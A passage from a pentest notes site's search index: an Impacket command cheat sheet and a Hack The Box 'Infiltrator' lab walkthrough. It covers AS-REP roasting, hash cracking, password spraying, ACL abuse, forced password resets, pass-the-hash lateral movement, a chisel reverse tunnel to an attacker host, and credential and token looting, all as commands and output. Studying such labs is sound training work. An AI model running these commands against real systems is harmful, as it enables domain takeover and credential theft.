tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esamrdump.py \u0026lt;domain\u0026gt;/\u0026lt;username\u0026gt;:\u0026lt;password\u0026gt;@\u0026lt;target_IP\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eEnumerate domain user :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGetADUsers.py -all pentesting.local/ippsec:Password12345 -dc-ip 192.168.10.50\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eLateral movement :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epsexec.py -hashes \u003cspan class=\"s1\"\u003e\u0026#39;LMhash:NThash\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;DOMAIN/USER@TARGET\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esmbexec.py -hashes \u003cspan class=\"s1\"\u003e\u0026#39;LMhash:NThash\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;DOMAIN/USER@TARGET\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewmiexec.py -hashes \u003cspan class=\"s1\"\u003e\u0026#39;LMhash:NThash\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;DOMAIN/USER@TARGET\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eatexec.py -hashes \u003cspan class=\"s1\"\u003e\u0026#39;LMhash:NThash\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;DOMAIN/USER@TARGET\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edcomexec.py -hashes \u003cspan class=\"s1\"\u003e\u0026#39;LMhash:NThash\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;DOMAIN/USER@TARGET\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eFind the right  tool :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enxc smb 10.10.202.39 --use-kcache -x whoami\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eatexec.py -hashes \u003cspan class=\"s1\"\u003e\u0026#39;:a29542cb2707bf6d6c1d2c9311b0ff02\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ws01\u0026#39;\u003c/span\u003e/\u003cspan class=\"s1\"\u003e\u0026#39;Administrator\u0026#39;\u003c/span\u003e@\u003cspan class=\"s1\"\u003e\u0026#39;10.10.202.39\u0026#39;\u003c/span\u003e whoami\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Impacket"},{"content":"Scan :\nPORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Infiltrator.htb |_http-server-header: Microsoft-IIS/10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-02 11:57:34Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR | Not valid before: 2024-08-04T18:48:15 |_Not valid after: 2099-07-17T18:48:15 |_ssl-date: 2024-09-02T11:58:53+00:00; +2s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-09-02T11:58:53+00:00; +2s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR | Not valid before: 2024-08-04T18:48:15 |_Not valid after: 2099-07-17T18:48:15 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-09-02T11:58:53+00:00; +2s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR | Not valid before: 2024-08-04T18:48:15 |_Not valid after: 2099-07-17T18:48:15 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-09-02T11:58:53+00:00; +2s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR | Not valid before: 2024-08-04T18:48:15 |_Not valid after: 2099-07-17T18:48:15 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-09-02T11:58:53+00:00; +2s from scanner time. | rdp-ntlm-info: | Target_Name: INFILTRATOR | NetBIOS_Domain_Name: INFILTRATOR | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: infiltrator.htb | DNS_Computer_Name: dc01.infiltrator.htb | DNS_Tree_Name: infiltrator.htb | Product_Version: 10.0.17763 |_ System_Time: 2024-09-02T11:58:13+00:00 | ssl-cert: Subject: commonName=dc01.infiltrator.htb | Not valid before: 2024-07-30T13:20:17 |_Not valid after: 2025-01-29T13:20:17 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1s, deviation: 0s, median: 1s | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2024-09-02T11:58:16 |_ start_date: N/A\rEnum : - David Anderson --\u0026gt; d.anderson - Olivia Martinez --\u0026gt; o.martinez - Kevin Turner --\u0026gt;k.turner - Amanda Walker --\u0026gt;a.walker - Marcus Harris --\u0026gt;m.harris - Lauren Clark --\u0026gt;l.clark - Ethan Rodriguez e.rodriguez\rAesproasting : username-anarchy -i users.txt \u0026gt; out.txt kerbrute userenum --dc dc01.infiltrator.htb -d infiltrator.htb users GetNPUsers.py infiltrator/ -usersfile users -format hashcat -dc-ip dc01.infiltrator.htb hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt l.clark : WAT?watismypass! netexec smb 10.129.162.64 -u l.clark -p \u0026#39;WAT?watismypass!\u0026#39; --rid-brute | grep \u0026#39;\\\\\u0026#39; | cut -d $\u0026#39;\\\\\u0026#39; -f2 | cut -d \u0026#39; \u0026#39; -f1 | tee -a users_rid.txt\rEnum : bloodhound-python -d \u0026#39;infiltrator.htb\u0026#39; -u \u0026#39;l.clark\u0026#39; -p \u0026#39;WAT?watismypass!\u0026#39; -ns 127.0.0.1 -dc dc01.infiltrator.htb -c all\rUser Description : netexec ldap 10.129.96.85 -u l.clark -p \u0026#39;WAT?watismypass!\u0026#39; --user K.turner | MessengerApp@Pass!\rSpraying : netexec smb 10.129.62.59 -u users_rid.txt -p \u0026#39;WAT?watismypass!\u0026#39; --continue-on-success infiltrator.htb\\D.anderson:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION infiltrator.htb\\L.clark:WAT?watismypass! infiltrator.htb\\M.harris:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION netexec smb 10.129.62.59 -u users_rid.txt -p \u0026#39;WAT?watismypass!\u0026#39; --continue-on-success -k infiltrator.htb\\D.anderson:WAT?watismypass! infiltrator.htb\\L.clark:WAT?watismypass!\rModifying krb5.conf : [libdefaults] default_realm = INFILTRATOR.HTB [realms] INFILTRATOR.HTB = { kdc = 10.10.11.31 admin_server = 10.10.11.31 } [domain_realm] .infiltrator.htb = INFILTRATOR.HTB infiltrator.htb = INFILTRATOR.HTB\rReset password : getTGT.py \u0026#39;infiltrator.htb\u0026#39;/\u0026#39;d.anderson\u0026#39;@$t dacledit.py -action write -rights FullControl -principal d.anderson -target-dn \u0026#34;OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB\u0026#34; -inheritance -k -dc-ip $t infiltrator.htb/ bloodyAD --host $t -d \u0026#34;infiltrator.htb\u0026#34; -k set password e.rodriguez \u0026#34;Password1234\u0026#34; bloodyAD --host $t -d \u0026#34;infiltrator.htb\u0026#34; -u \u0026#34;e.rodriguez\u0026#34; -p \u0026#34;Password1234\u0026#34; add groupMember \u0026#34;CHIEFS MARKETING\u0026#34; \u0026#34;e.rodriguez\u0026#34; bloodyAD --host $t -d \u0026#34;infiltrator.htb\u0026#34; -u \u0026#34;e.rodriguez\u0026#34; -p \u0026#34;Password1234\u0026#34; set password m.harris \u0026#34;Password12345\u0026#34;\rFoothold : getTGT.py \u0026#39;infiltrator.htb\u0026#39;/\u0026#39;m.harris\u0026#39;@10.129.62.59 evil-winrm -i dc01.infiltrator.htb -r INFILTRATOR.HTB\rCreds looting : *Evil-WinRM* PS C:\\\u0026gt; cmd /c dir /A Volume in drive C has no label. Volume Serial Number is 96C7-B603 Directory of C:\\ 02/19/2024 06:45 PM \u0026lt;DIR\u0026gt; $Recycle.Bin 02/19/2024 08:32 AM \u0026lt;DIR\u0026gt; .NET Framework 4.8 12/04/2023 07:21 PM \u0026lt;JUNCTION\u0026gt; Documents and Settings [C:\\Users] 12/04/2023 11:14 AM \u0026lt;DIR\u0026gt; inetpub 09/04/2024 09:02 PM 738,197,504 pagefile.sys 11/05/2022 12:03 PM \u0026lt;DIR\u0026gt; PerfLogs 02/23/2024 06:06 AM \u0026lt;DIR\u0026gt; Program Files 02/20/2024 04:18 AM \u0026lt;DIR\u0026gt; Program Files (x86) 02/22/2024 01:27 PM 0 Program1 02/25/2024 08:34 AM 0 Program2 09/04/2024 09:05 PM \u0026lt;DIR\u0026gt; ProgramData 12/04/2023 07:21 PM \u0026lt;DIR\u0026gt; Recovery 02/20/2024 04:22 AM \u0026lt;DIR\u0026gt; System Volume Information 09/05/2024 12:37 AM \u0026lt;DIR\u0026gt; temp 08/02/2024 04:51 PM \u0026lt;DIR\u0026gt; Users 08/21/2024 01:53 PM \u0026lt;DIR\u0026gt; Windows\r[Sep 05, 2024 - 10:19:49 (CEST)] exegol-Algo out # cat OutputMysql.ini [SETTINGS] SQLPort=14406 Version=1.0.0 [DBCONFIG] DBUsername=root DBPassword=ibWijteig5 DBName=outputwall [PATHCONFIG] ;mysql5.6.17 MySQL=mysql Log=log def_conf=settings MySQL_data=data Backup=backup\rPrivesc : ./chisel.exe client 10.10.14.190:8888 R:1080:socks ./chisel server -p 8888 -reverse \u0026amp; #proxychain to burp\runattended : SELECT LOAD_FILE(\u0026#39;C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\u0026#39;); fce216c915adb6d843abe6b1defc7dce\rAttended : PS C:\\UserExplorer\u0026gt; .\\UserExplorer.exe -u m.harris -p D3v310p3r_Pass@1337! -s m.harris Attempting Service Connection... proxychains -q mysql -h 10.10.11.31 -u root -p -P 14406 |user_name | register_date | email | password | db_string | is_active | exp_date | max_users | plan | license_key | -----------+--------------+---------------------------------------+-----------+---------------------+---------------------+------------------------------------------+-----------+-----------+---------------------+-----------+------+-------------+----- | admin | 2014-10-18 10:46:30 | demo@outputtime.com | 38f078a81a2b033d197497af5b77f95b50bfcfb8 | | 1 | 2031-10-29 06:23:42 | 0 | T | 38f078a81a2b033d197497af5b77f95b50bfcfb8:admin12\rTokens : MariaDB [outputwall]\u0026gt; select * from ot_wall_tokens; +----------+---------+------------+---------------------------+-----------+-----------+-------------------------------------------------------------------------------+---------------------+ | token_id | user_id | first_name | email | user_role | entity_id | auth_token | expiry_date | +----------+---------+------------+---------------------------+-----------+-----------+-------------------------------------------------------------------------------+---------------------+ | 1 | 7 | K.turner | turner@infiltrator.htb | U | 1 | iX9Z\\/yslevNIY0R6aKNzBebgT_KpW4BlaGHjWS1zpd5QcmaRx8UGwBvaMxy3Q3Wb2E5XhI9lpIo= | 2024-02-22 00:00:00 | | 7 | 9 | winrm_svc | winrm_svc@infiltrator.htb | U | 1 | iX9Z\\/yslevMmHLWW_pvaVChN6kbwB_cbGHvAA75yee65xBQMd20Dgmf2iXD18Oq9hiwcgIfB1uo= | 2024-02-26 00:00:00 | | 16 | 1 | Admin | | A | 1 | iX9Z\\/yslevMJZgSfyKCEdHJE3RjYRSAMORYGfFRYTag9N3WBn20KJrgPbziU39gX | 2024-09-06 00:00:00 | +----------+---------+------------+---------------------------+-----------+-----------+-------------------------------------------------------------------------------+---------------------+\r","date":"2023-09-07","id":58,"permalink":"/notes/lab/htb/infiltrator/","summary":"\u003cp\u003eScan :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp   open  http          Microsoft IIS httpd 10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e http-methods:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  Potentially risky methods: TRACE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Infiltrator.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Microsoft-IIS/10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-09-02 11:57:34Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: infiltrator.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-04T18:48:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2099-07-17T18:48:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-09-02T11:58:53+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e +2s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: infiltrator.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-09-02T11:58:53+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e +2s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-04T18:48:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2099-07-17T18:48:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: infiltrator.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-09-02T11:58:53+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e +2s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-04T18:48:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2099-07-17T18:48:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: infiltrator.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-09-02T11:58:53+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e +2s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-04T18:48:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2099-07-17T18:48:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-09-02T11:58:53+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e +2s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: INFILTRATOR\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: INFILTRATOR\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: DC01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: infiltrator.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: dc01.infiltrator.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Tree_Name: infiltrator.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.17763\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-09-02T11:58:13+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc01.infiltrator.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-30T13:20:17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-01-29T13:20:17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: DC01\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_clock-skew: mean: 1s, deviation: 0s, median: 1s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   311:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled and required\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2024-09-02T11:58:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eEnum :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- David Anderson --\u0026gt;  d.anderson\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Olivia 